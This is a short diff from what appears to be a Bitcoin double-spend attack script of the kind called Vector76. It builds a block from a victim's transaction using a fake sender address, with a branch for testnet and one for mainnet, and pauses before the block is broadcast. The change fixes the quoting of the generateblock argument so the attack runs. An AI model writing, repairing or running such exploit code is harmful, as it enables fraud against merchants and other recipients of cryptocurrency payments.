@@ -125,9 +125,9 @@ print("Mining fake tx block...")
 
 vector76_response = None
 if testnet:
-    vector76_response = rpc_node.call("generateblock", fake_from.address.testnet.pubaddr1, f"'[{tx_victim}]'")
+    vector76_response = rpc_node.call("generateblock", fake_from.address.testnet.pubaddr1, f"['{tx_victim}']")
 else:
-    vector76_response = rpc_node.call("generateblock", fake_from.address.mainnet.pubaddr1, f"'[{tx_victim}]'")
+    vector76_response = rpc_node.call("generateblock", fake_from.address.mainnet.pubaddr1, f"['{tx_victim}']")
 
 print(vector76_response)
 input("--- Send the block after pressing the enter key. --- ")
